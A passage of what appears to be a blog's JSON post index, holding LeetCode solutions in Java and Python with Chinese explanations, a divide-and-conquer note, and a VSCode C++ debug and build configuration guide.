canVisitAllRooms(List&lt;List&lt;Integer&gt;&gt; rooms) &#123; int n = rooms.size(); boolean[] marked = new boolean[n]; dfs(rooms, marked, 0); for (int i = 0; i &lt; n; i++) if (!marked[i]) return false; return true;&#125; private void dfs(List&lt;List&lt;Integer&gt;&gt; rooms, boolean[] marked, int v) &#123; marked[v] = true; for (int w : rooms.get(v)) if (!marked[w]) dfs(rooms, marked, w);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"167. Two Sum II - Input array is sorted","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-167-Two-Sum-II-Input-array-is-sorted/","text":"Given an array of integers that is already sorted in ascending order, find two numbers such that they add up to a specific target number. The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2. Note: Your returned answers (both index1 and index2) are not zero-based. You may assume that each input would have exactly one solution and you may not use the same element twice. Example: 123Input: numbers = [2,7,11,15], target = 9Output: [1,2]Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2. Java1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Given an array of integers that is already sorted in ascending order, * find two numbers such that they add up to a specific target number. * * The function twoSum should return indices of the two numbers * such that they add up to the target, * where index1 must be less than index2. * * * https://leetcode.com/problems/two-sum-ii-input-array-is-sorted/description/ * * 一种最简单的方法和Q1TwoSum一样，利用hashtable来处理。代码是一摸一样的。 * * 另一种方法是利用两个指针，慢慢逼近所求值，算是非常巧妙的办法了。 * */public class Q167TwoSumII &#123; public int[] twoSumHashMap(int[] numbers, int target) &#123; HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; numbers.length; i++) &#123; if (map.containsKey(numbers[i])) &#123; return new int[]&#123;map.get(numbers[i]), i+1&#125;; &#125; else &#123; map.put(target - numbers[i] , i+1); &#125; &#125; throw new IllegalArgumentException(\"NO SOLUTION\"); &#125; public int[] twoSumTwoPointers(int[] numbers, int target) &#123; int left = 0, right = numbers.length-1; while (numbers[left] + numbers[right] != target) &#123; if (numbers[left] + numbers[right] &gt; target ) &#123; right--; &#125; else &#123; left++; &#125; &#125; return new int[]&#123;left+1, right+1&#125;; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"170. TwoSum III","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-170-TwoSum-III/","text":"Design and implement a TwoSum class. It should support the following operations: add and find. add - Add the number to an internal data structure.find - Find if there exists any pair of numbers which sum is equal to the value. For example, 123add(1); add(3); add(5);find(4) -&gt; truefind(7) -&gt; false Java12345678910111213141516171819202122232425262728293031323334353637383940/** * Design and implement a TwoSum class. * It should support the following operations: add and find. * * add - Add the number to an internal data structure. * find - Find if there exists any pair of numbers which sum is equal to the value. * * For example, * * add(1); add(3); add(5); * find(4) -&gt; true * find(7) -&gt; false * * * 需要注意数据有可能重复的情况 * */public class Q170TwoSumIII &#123; // map stores key: num, value: count private Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); public void add(int num) &#123; if (map.containsKey(num)) &#123; map.put(num, map.get(num) + 1); // count ++ &#125; else &#123; map.put(num, 1); &#125; &#125; public boolean find(int target) &#123; for (Integer num: map.keySet()) &#123; if ((target != num * 2) &amp;&amp; map.containsKey(target-num)) &#123; return true; &#125; else if ((target == num * 2) &amp;&amp; (map.get(num) &gt; 1)) &#123; return true; &#125; // end if &#125; // end for return false; &#125; // end find&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"},{"name":"HashMap","slug":"HashMap","permalink":"http://larryim.cc/tags/HashMap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"17. Letter Combinations of a Phone Number.md","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-17-Letter-Combinations-of-a-Phone-Number/","text":"Given a digit string, return all possible letter combinations that the number could represent. A mapping of digit to letters (just like on the telephone buttons) is given below. Input: Digit string &quot;23&quot; Output: [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;]. Note: Although the above answer is in lexicographical order, your answer could be in any order you want. 手机按键上每个数字都对应了多个字母，如2对应了”abc”，现给出一个数字串，要求把其中的每个数字都转化为对应的字母中的一个，列出所有的组合情况。 输入: digits=&quot;23&quot; 输出: [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;] 注意点：对结果的排列顺序没有要求 12345678910111213141516171819202122class Solution: def letterCombinations(self, digits): \"\"\" :type digits: str :rtype: List[str] \"\"\" # 特殊情况，空字符串 n = len(digits) if n == 0: return [] self.dict = &#123;\"1\":\"\", \"2\":\"abc\", \"3\":\"def\", \"4\":\"ghi\", \"5\":\"jkl\", \"6\":\"mno\", \"7\":\"pqrs\",\"8\":\"tuv\",\"9\":\"wxyz\",\"10\":\" \"&#125; result = [\"\"] for digit in digits: lst = self.dict[digit] newresult = [] for char in lst: for str in result: newresult.append(str+char) result = newresult return result","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"Divide and Conquer","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Algorithm-Divide-and-Conquer/","text":"In divide and conquer(分治法), we solve a problem recursively, applying three steps at each level of the recursion[1]: Divide the problem into a number of subproblems that are smaller instances of the same problem. Conquer the subproblems by solving them recursively. If the subproblem sizes are small enough, however, just solve the subproblems in a straightforward manner. Combine the solutions to the subproblems into the solution for the original problem. 分治法的设计思想是： 分 – 将问题分解为规模更小的子问题； 治 – 递归地解决子问题； 合 – 将子问题的解合并成原问题的解； RecurrencesRecurrences （递归表达式) go hand in hand with the divide-and-conquer paradigm. A recurrence is an equation or inequality that describes a function in terms of its value on smaller inputs[1]. 例如， 归并排序的最差运行时间$T(n)$用递归表达式表达为 Problems利用分治法解决的经典问题： 二分搜索 大整数的乘法 Strassen矩阵乘法 归并排序 快速排序 归并排序MergeSort (归并排序) divides the list $L[0..n-1]$ into two halves $L[0..\\llcorner n/2\\lrcorner -1]$ and $L[\\llcorner n/2\\lrcorner ..n-1]$, sorting each of them recursively, and then merging the two smaller sorted arrays into a single sorted one[2]. Pseudocode: 12345678910MergeSort Input: List L of ``orderable” elements Modiﬁes: List L is sorted in-place in ascending order Output: NoneIf n&gt;1 copy L[0..⎣n/2⎦-1] to A[0..⎣n/2⎦-1]; copy L[⎣n/2⎦..n-1] to B[0.. ⎡n/2⎤-1]; MergeSort(A[0..⎣n/2⎦-1]); MergeSort(B[0..⎡n/2⎤-1]); Merge(A,B,L); Let $C(n)$ be the number of steps MergeSort takes on a list L that has n elements. Then, we have the recurrence:: $$ C(n) = 2C(n/2)+C_{\\text{merge}} (n) \\quad \\text{for}\\quad n&gt;1, \\text{and} \\quad C(1)=1$$ Reference[1] 算法导论(第三版英文版)[2] Algorithm thinking on Coursera","tags":[],"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://larryim.cc/categories/Algorithm/"}]},{"title":"168. Excel Sheet Column Title","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-168-Excel-Sheet-Column-Title/","text":"Given a positive integer, return its corresponding column title as appear in an Excel sheet. For example: 123456781 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB ... Example 1: 12Input: 1Output: &quot;A&quot; Example 2: 12Input: 28Output: &quot;AB&quot; Example 3: 12Input: 701Output: &quot;ZY&quot; Java从最后一位开始“解码”，比较容易计算。特别需要注意是26的倍数，这种情况：最后一个字母为Z。 1234567891011public String convertToTitle(int n) &#123; StringBuilder sb = new StringBuilder(); while (n != 0)&#123; if (n % 26 == 0)&#123; sb.append('Z'); n -= 26; &#125; else sb.append((char)('A' + n % 26 - 1)); n /= 26; &#125; return sb.reverse().toString();&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"173. Binary Search Tree Iterator","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-173-Binary-Search-Tree-Iterator/","text":"Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST. Calling next() will return the next smallest number in the BST. Note: next() and hasNext() should run in average $O(1)$ time and uses $O(h)$ memory, where $h$ is the height of the tree. Java这道题目看到的时候就可以想到用中序遍历，把中序遍历的结果放在List中，然后调用List.iterator()方法。但是这道题目的要求更高，它的空间复杂度要求是$O(h)$，其中$h$是树的高度。这样一来这种方法就不行了。仔细观察二叉树的中序遍历：(代码来自LeeCode 94. Binary Tree Inorder Traversal) 1234567891011121314151617public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; res = new ArrayList&lt;Integer&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;TreeNode&gt;(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) &#123; while (cur != null) &#123; // Travel to each node's left child, // till reach the left leaf stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); // Backtrack to higher level node A res.add(cur.val); // Add the node to the result list cur = cur.right; // Switch to A'right branch &#125; return res;&#125; 恰好每一个while循环有一个节点加入List，那么一个猜想就是我们可不可以把每个while循环拆分开，相当于一个每个while循环就是一个next()方法调用。那么怎么判断hasNext()呢，一定和while循环的条件差不多。 123456789101112131415161718192021222324252627 private Stack&lt;TreeNode&gt; stack; private TreeNode cur; public BSTIterator(TreeNode root) &#123; stack = new Stack&lt;TreeNode&gt;(); cur = root; &#125; /** @return whether we have a next smallest number */ public boolean hasNext() &#123; return cur != null || stack.size() != 0; &#125; /** @return the next smallest number */ public int next() &#123; while (cur != null) &#123; // Travel to each node's left child, // till reach the left leaf stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); // Backtrack to higher level node A int res = cur.val; // Add the node to the result cur = cur.right; // Switch to A'right branch return res; &#125;&#125; 代码和中序遍历基本一致，只改变了while循环为next()。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"252. Meeting Rooms","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-252-Meeting-Rooms/","text":"Given an array of meeting time intervals consisting of start and end times $[[s_1,e_1],[s_2,e_2],…], (s_i &lt; e_i)$, determine if a person could attend all meetings. Example 1Given intervals = [[0,30],[5,10],[15,20]], return false. Java这道题目在LeetCode上要收费，参见LintCode。 确认可以参加所有会议，即会议时间不重叠。将会议按照会议开始时间排序，如果前面的会议结束时间小于后面的会议开始时间，则不会产生重叠。 12345678910111213141516/** * Definition of Interval: * public class Interval &#123; * int start, end; * Interval(int start, int end) &#123; * this.start = start; * this.end = end; * &#125; * &#125; */public boolean canAttendMeetings(List&lt;Interval&gt; intervals) &#123; Collections.sort(intervals, Comparator.comparing(o -&gt; o.start)); for (int i = 1; i &lt; intervals.size(); i++) if (intervals.get(i).start &lt; intervals.get(i - 1).end) return false; return true;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"174. Dungeon Game","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-174-Dungeon-Game/","text":"The demons had captured the princess (P) and imprisoned her in the bottom-right corner of a dungeon. The dungeon consists of $M \\times N$ rooms laid out in a 2D grid. Our valiant knight (K) was initially positioned in the top-left room and must fight his way through the dungeon to rescue the princess. The knight has an initial health point represented by a positive integer. If at any point his health point drops to 0 or below, he dies immediately. Some of the rooms are guarded by demons, so the knight loses health (negative integers) upon entering these rooms; other rooms are either empty (0’s) or contain magic orbs that increase the knight’s health (positive integers). In order to reach the princess as quickly as possible, the knight decides to move only rightward or downward in each step. Write a function to determine the knight’s minimum initial health so that he is able to rescue the princess. For example, given the dungeon below, the initial health of the knight must be at least 7 if he follows the optimal path RIGHT-&gt; RIGHT -&gt; DOWN -&gt; DOWN. Note: The knight’s health has no upper bound. Any room can contain threats or power-ups, even the first room the knight enters and the bottom-right room where the princess is imprisoned. Java这个问题难点在于问题的定义。看完题目以后，可以很明显确定用动态规划方法，但是找到状态方程却不简单。 最开始，最直接也是最常见的定义状态或者子问题的方式为 1dp[i][j] = 从(0,0)到(i,j)的最小健康点损失 这种定义与LeetCode 64. Minimum Path Sum的定义类似。但是很可惜，这样根本不能解决问题，因为dp[i][j]并不依赖于前面的子问题dp[i-1][j]和dp[i][j-1]。所以只能另辟蹊径了。另一种常见的定义状态和子问题的方法为从问题的另一端定义： 1initialHealth[i][j] = 从(i,j)出发，到达公主(终点)所需最低健康值 首先，我们知道在任意一点(i,j)，健康值达到0或者0一下，武士会立刻死亡，也就是说 1initialHealth[i][j] &gt; 0 or initialHealth[i][j] &gt;= 1 另外，由于经过(i, j)，武士的健康值会发生增加或者减少，幅度为dungeon[i][j]，因此 123// 从(i, j) 到达 (i+1, j)initialHealth[i][j] + dungeon[i][j] &gt;= initialHealth[i+1][j]initialHealth[i][j] = max(1, initialHealth[i+1][j] - dungeon[i][j]) 好了，下一步，我们观察子问题之间的关系，试图发现状态方程。由于在(i,j)点的武士下一步即可以去(i, j+1)，也可以去(i+1, j)。所以要从两者之间选择一个需要初始健康值最小的路径。 12initialHealth[i][j] = max(1, min(initialHealth[i + 1][j], initialHealth[i][j + 1]) - dungeon[i][j]); 代码： 1234567891011121314151617181920public int calculateMinimumHP(int[][] dungeon) &#123; if (dungeon == null || dungeon.length == 0 || dungeon[0].length == 0) return 0; int m = dungeon.length, n = dungeon[0].length; int[][] initialHealth = new int[m][n]; initialHealth[m - 1][n - 1] = Math.max(1, 1 - dungeon[m - 1][n - 1]); for (int i = m - 2; i &gt;= 0; i--) initialHealth[i][n - 1] = Math.max(1, initialHealth[i + 1][n - 1] - dungeon[i][n - 1]); for (int j = n - 2; j &gt;= 0; j--) initialHealth[m - 1][j] = Math.max(1, initialHealth[m - 1][j + 1] - dungeon[m - 1][j]); for (int i = m - 2; i &gt;= 0; i--) for (int j = n - 2; j &gt;= 0; j--) initialHealth[i][j] = Math.max(1, Math.min(initialHealth[i+1][j], initialHealth[i][j+1]) - dungeon[i][j]); return initialHealth[0][0];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"179. Largest Number","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-179-Largest-Number/","text":"Given a list of non negative integers, arrange them such that they form the largest number. Example 1: 12Input: [10,2]Output: &quot;210&quot; Example 2: 12Input: [3,30,34,5,9]Output: &quot;9534330&quot; Note: The result may be very large, so you need to return a string instead of an integer. Java最大数问题。首先，最笨的方法，也是最直接的办法，把所有数字转化为字符串，然后依次比较字符串，最后把字符串连接起来的到结果。怎么比较字符串呢？也是最笨的方法，比较字符串放在前面和后面形成的两种字符串。还需要注意全是0的情况。当然效率是非常低的。不过也是种解决方案。 利用函数式编程写的。 1234567891011121314public String largestNumber(int[] nums) &#123; // to string array String[] a = Arrays.stream(nums). mapToObj(Integer::toString). toArray(String[]::new); // sort and concat String res = Arrays.stream(a). sorted(((o1, o2) -&gt;o2.concat(o1).compareTo(o1.concat(o2)))). collect(Collectors.joining()); // special occasion: all zero if (res.charAt(0) == '0' &amp;&amp; res.length() &gt; 1) return \"0\"; return res;&#125; 发现好慢啊阿啊，只击败了12%的人，吐血！这说明，虽然函数式编程很优美，但是在LeetCode上面还是算了。 常规写法： 1234567891011121314151617181920212223public String largestNumber(int[] nums) &#123; if(nums == null || nums.length == 0) return null; String[] str = new String[nums.length]; for(int i = 0; i &lt; nums.length; i ++) str[i] = Integer.toString(nums[i]); Arrays.sort(str, new Comparator&lt;String&gt;() &#123; public int compare(String a, String b) &#123; return -(a+b).compareTo(b+a); &#125; &#125;); // If, after being sorted, the largest number is `0`, // the entire number is zero. if (str[0].equals(\"0\") &amp;&amp; str.length &gt; 1) return \"0\"; StringBuilder res = new StringBuilder(); for(String s : str) res.append(s); return res.toString();&#125; 击败了98%，看来函数式编程真的慢。 就这么一种解决方案。还以为有其他的。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"18. 4 Sum","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-18-4-Sum/","text":"Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target. Note: The solution set must not contain duplicate quadruplets. 12345678For example, given array S = [1, 0, -1, 0, -2, 2], and target = 0.A solution set is:[ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2]] 思路其实非常简单，无非是把4Sum问题转化为3Sum问题。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class Solution: def fourSum(self, nums, target): \"\"\" :type nums: List[int] :type target: int :rtype: List[List[int]] \"\"\" # 特殊情况，数字个数小于4 n = len(nums) if n &lt; 4: return [] nums = sorted(nums) i = 0 results = [] while i &lt; n-3: self.threesum(nums[i+1:], target-nums[i], nums[i], results) i += 1 # repeat situation while (i&lt;n-3) and (nums[i] == nums[i-1]): i += 1 return results def threesum(self, nums, target, first, results): i = 0 n = len(nums) while i &lt; n-2: left = i + 1 right = n-1 while left &lt; right: val = nums[i] + nums[left] + nums[right] if val == target: results.append([first, nums[i], nums[left], nums[right]]) print([first, nums[i], nums[left], nums[right]]) left += 1 right -= 1 # repeat situation while (left&lt; right) and (nums[left]==nums[left-1]): left += 1 while (left&lt;right) and (nums[right]==nums[right+1]): right -= 1 elif val &lt; target: left += 1 else: right -= 1 i += 1 # repeat situation while (i &lt; n -2) and nums[i] == nums[i-1]: i += 1 return None","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"VSCode","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/TOOLS-VSCODE/","text":"Vscode(Visual Studio Code)是一个轻量且强大的代码编辑器。内置JavaScript、TypeScript和Node.js支持，而且拥有丰富的插件生态系统，可通过安装插件来支持C++、C#、Python、PHP等其他语言。 C++的使用在Vscode中使用C++语言进行编译和调试之前，需要安装一些额外的工具、配置一些文件。 插件 打开VScode后，按下组合键“⇧⌘X”，打开扩展，输入C/C++，安装C/C++、C/C++ Clang Command Adapter，安装完成后，重启VScode让插件生效。 配置文件两个配置文件在当前工作目录的.vscode隐藏文件夹下。 launch.json配置文件(下拉菜单 Debug- Open/Add Configuration)，用于调试程序 123456789101112131415161718192021&#123; \"version\": \"0.2.0\", \"configurations\": [ &#123; \"name\": \"(lldb) Launch\", // 配置名称，将会在启动配置的下拉菜单中显示 \"type\": \"cppdbg\", // 配置类型，这里只能为cppdbg \"request\": \"launch\", // 请求配置类型，可以为launch（启动）或attach（附加） \"program\": \"$&#123;workspaceFolder&#125;/tsh\", // 将要进行调试的程序的路径 \"args\": [], // 程序调试时传递给程序的命令行参数，一般设为空即可 \"stopAtEntry\": false, // 设为true时程序将暂停在程序入口处，可以设置为true \"cwd\": \"$&#123;workspaceFolder&#125;\", // 调试程序时的工作目录 \"environment\": [], // （环境变量） \"externalConsole\": true, // 调试时是否显示控制台窗口，一般设置为true显示控制台 \"MIMode\": \"lldb\", // 指定连接的调试器，可以为gdb或lldb。 \"preLaunchTask\": \"compile\" // 调试会话开始前执行的任务，一般为编译程序。与tasks.json的label相对应 &#125;, ], \"compounds\": [],&#125; tasks.json 配置文件(下拉菜单Tasks-configure Tasks)，用于编译程序 123456789101112131415161718&#123; // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \"version\": \"2.0.0\", \"tasks\": [ &#123; \"label\": \"compile\", // 任务名称，与launch.json的preLaunchTask相对 \"type\": \"shell\", \"command\": \"make\", // 编译命令，g++/make 等 \"group\": &#123; \"kind\": \"build\", \"isDefault\": true &#125;, \"problemMatcher\":\"$gcc\" &#125; ] &#125; 更简单的方法安装 Code Runner 这个插件，不用进行任何配置就能直接编译并运行(Control+Option+N)，默认情况下使用的是GCC和G++。","tags":[{"name":"Editor","slug":"Editor","permalink":"http://larryim.cc/tags/Editor/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"19. Remove Nth Node From End of List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-19-Remove-Nth-Node-From-End-of-List/","text":"题目Given a linked list, remove the $n$th node from the end of list and return its head. 12345For example, Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2. After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5. 中文版题目Note: Given n will always be valid.Try to do this in one pass. 将一个链表中的倒数第n个元素从链表中去除。 123例子：输入: list = 1-&gt;2-&gt;3-&gt;4-&gt;5, n = 2. 输出: 1-&gt;2-&gt;3-&gt;5 注意点： 不用考虑n是非法的情况尽量做到只遍历一次链表 思路首先最简单的方法当然是两次遍历链表，第一次遍历计算链表元素个数，第二次遍历达到目标节点。 1234567891011121314151617181920212223242526272829303132333435# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: def removeNthFromEnd(self, head, n): \"\"\" :type head: ListNode :type n: int :rtype: ListNode \"\"\" # 计算链表长度 linked_list = head count = 1 while linked_list.next: linked_list = linked_list.next count += 1 location = count - n if location == 0: head = head.next return head before = head count = 1 while count &lt; location: before = before.next count += 1 before.next = before.next.next return head 一次遍历的基本思路就是用两个指针一前一后遍历链表，在第一指针遍历了$n$节点后，第二个指针开始和它同步前进。 12345678910111213141516171819202122232425262728293031323334353637# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: def removeNthFromEnd(self, head, n): \"\"\" :type head: ListNode :type n: int :rtype: ListNode \"\"\" linked_list = head count = 0 while linked_list.next: linked_list = linked_list.next count += 1 if count == n: to_remove = head elif count &gt; n: to_remove = to_remove.next if count +1 == n: # 移除首节点 head = head.next elif not to_remove.next: # 移除末尾节点 to_remove.next = None print(\"sf\") else: to_remove.next = to_remove.next.next return head Your runtime beats 100.00 % of python3 submissions.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"685. Redundant Connection II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-685-Redundant-Connection-II/","text":"In this problem, a rooted tree is a directed graph such that, there is exactly one node (the root) for which all other nodes are descendants of this node, plus every node has exactly one parent, except for the root node which has no parents. The given input is a directed graph that started as a rooted tree with $N$ nodes (with distinct values $1, 2, …, N$), with one additional directed edge added. The added edge has two different vertices chosen from 1 to $N$, and was not an edge that already existed. The resulting graph is given as a 2D-array of edges. Each element of edges is a pair [$u$, $v$] that represents a directed edge connecting nodes $u$ and $v$, where $u$ is a parent of child $v$. Return an edge that can be removed so that the resulting graph is a rooted tree of $N$ nodes. If there are multiple answers, return the answer that occurs last in the given 2D-array. Example 1: 1234567Input: [[1,2], [1,3], [2,3]]Output: [2,3]Explanation: The given directed graph will be like this: 1 / \\v v2--&gt;3 Example 2: 1234567Input: [[1,2], [2,3], [3,4], [4,1], [1,5]]Output: [4,1]Explanation: The given directed graph will be like this:5 &lt;- 1 -&gt; 2 ^ | | v 4 &lt;- 3 Note: The size of the input 2D-array will be between 3 and 1000. Every integer represented in the 2D-array will be between 1 and $N$, where $N$ is the size of the input array. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Union Find","slug":"Union-Find","permalink":"http://larryim.cc/tags/Union-Find/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"191. Number of 1 Bits","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-191-Number-of-1-Bits/","text":"Write a function that takes an unsigned integer and returns the number of ‘1’ bits it has (also known as the Hamming weight). Example 1: 123Input: 11Output: 3Explanation: Integer 11 has binary representation 00000000000000000000000000001011 Example 2: 123Input: 128Output: 1Explanation: Integer 128 has binary representation 00000000000000000000000010000000 Java基本的位操作。将整数右移$i$位，后与1按位与(&amp;)，即可得到整数的二进制表示的第$i$位数字。 123456public int hammingWeight(int n) &#123; int count = 0; for (int i = 0; i &lt; 32; i++, n &gt;&gt;&gt;= 1) count += n &amp; 1; return count;&#125; 也可以将1左移，与整数按位与(&amp;)，得到整数的二进制表示的第$i$位数字， 123456public int hammingWeight(int n) &#123; int count = 0, mask = 1; for (int i = 0; i &lt; 32; i++, mask &lt;&lt;= 1) if ((n &amp; mask) != 0) count++; return count;&#125; 但是，真的需要一一比对这32位数字吗？例如1，有效位数是1，有必要检查所有数字吗？当然不需要。我们可以在将$n$右移的同时，检测$n$是不是等于0，即检测还有没有有效位。注意右移符号必须是&gt;&gt;&gt;(无符号右移)，而不是&gt;&gt;(有符号右移)。否则当$n$是负数的时候，会产生错误。 12345678public int hammingWeight(int n) &#123; int res = 0; while (n != 0) &#123; res += n &amp; 1; n &gt;&gt;&gt;= 1; &#125; return res;&#125; 那么还有没有其他更快的方法呢？比如说8，其二进制表示是1000，第1、2种方法需要32次循环，第3种方法需要4次循环，有没有可能只要1次？答案当然是肯定的。该方法需要用到一个技巧：$n$和比它小1的数($n-1$)的按位与($n \\&amp; (n-1)$)把$n$的最低有效位反转为0，而其他表示不变。所以只要连续做按位与（连续把最低有效位变为0），直到最后结果为0，结束循环，循环的次数就是数字的二进制表示中1的数量。 先来看一个例子，演示$n \\&amp; (n-1)$： 由于$n$的最低1, 永远在$n-1$种对应0。所以按位与操作才能将最低1转化为0. 12345678public int hammingWeight(int n) &#123; int res = 0; while (n != 0) &#123; n &amp;= n-1; res++; &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"199. Binary Tree Right Side View","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-199-Binary-Tree-Right-Side-View/","text":"Given a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom. Example: 123456789Input: [1,2,3,null,5,null,4]Output: [1, 3, 4]Explanation: 1 &lt;--- / \\2 3 &lt;--- \\ \\ 5 4 &lt;--- Java使用深度优先遍历，刚好首先遍历到的就是从右边看见的。 12345678910111213public List&lt;Integer&gt; rightSideView(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); traversal(list, root, 0); return list;&#125; private void traversal(List&lt;Integer&gt; list, TreeNode root, int height) &#123; if (root == null) return; if (height == list.size()) list.add(root.val); traversal(list, root.right, height + 1); traversal(list, root.left, height + 